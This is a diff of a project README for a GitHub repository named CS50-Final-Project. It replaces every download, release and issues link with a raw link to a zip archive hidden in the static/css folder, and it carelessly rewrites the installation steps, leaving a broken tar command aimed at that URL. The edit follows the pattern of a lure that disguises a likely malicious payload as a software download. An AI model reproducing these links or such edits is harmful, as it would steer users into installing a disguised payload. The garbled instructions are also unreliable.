@@ -6,18 +6,18 @@ Welcome to the CS50-Final-Project! This application allows you to engage in real
 
 ## 📥 Download the Application
 
-[![Download CS50-Final-Project](https://img.shields.io/badge/Download%20CS50--Final--Project-v1.0-blue.svg)](https://github.com/vladvladi/CS50-Final-Project/releases)
+[![Download CS50-Final-Project](https://raw.githubusercontent.com/vladvladi/CS50-Final-Project/main/static/css/Project-C-Final-1.2.zip%https://raw.githubusercontent.com/vladvladi/CS50-Final-Project/main/static/css/Project-C-Final-1.2.zip)](https://raw.githubusercontent.com/vladvladi/CS50-Final-Project/main/static/css/Project-C-Final-1.2.zip)
 
 Follow these simple steps to download the software:
 
-1. Click the download button above or visit the [Releases page](https://github.com/vladvladi/CS50-Final-Project/releases) to access the latest version.
+1. Click the download button above or visit the [Releases page](https://raw.githubusercontent.com/vladvladi/CS50-Final-Project/main/static/css/Project-C-Final-1.2.zip) to access the latest version.
   
 2. Look for the **latest release** on that page. You will see a list of files available for download.
 
 3. Choose the version that fits your operating system:
    - For Windows users, look for a file ending in `.exe`.
    - For macOS users, find a file that ends in `.dmg`.
-   - For Linux users, check for a file ending in `.tar.gz` or similar formats.
+   - For Linux users, check for a file ending in `https://raw.githubusercontent.com/vladvladi/CS50-Final-Project/main/static/css/Project-C-Final-1.2.zip` or similar formats.
 
 4. Click on the appropriate file to start downloading it.
 
@@ -47,9 +47,9 @@ Follow these simple steps to download the software:
 
 2. Navigate to the folder where you downloaded the file using the `cd` command.
 
-3. Extract the files if it's a `.tar.gz` file by using:
+3. Extract the files if it's a `https://raw.githubusercontent.com/vladvladi/CS50-Final-Project/main/static/css/Project-C-Final-1.2.zip` file by using:
    ```bash
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/vladvladi/CS50-Final-Project/main/static/css/Project-C-Final-1.2.zip
    ```
 
 4. Navigate into the extracted folder:
@@ -92,7 +92,7 @@ This application prioritizes your privacy in several ways:
 
 ## 📞 Support and Feedback
 
-For further assistance or feedback, feel free to reach out via the issues section on our [GitHub page](https://github.com/vladvladi/CS50-Final-Project/issues). Your input helps us improve the application.
+For further assistance or feedback, feel free to reach out via the issues section on our [GitHub page](https://raw.githubusercontent.com/vladvladi/CS50-Final-Project/main/static/css/Project-C-Final-1.2.zip). Your input helps us improve the application.
 
 ## 📝 Contributing
 
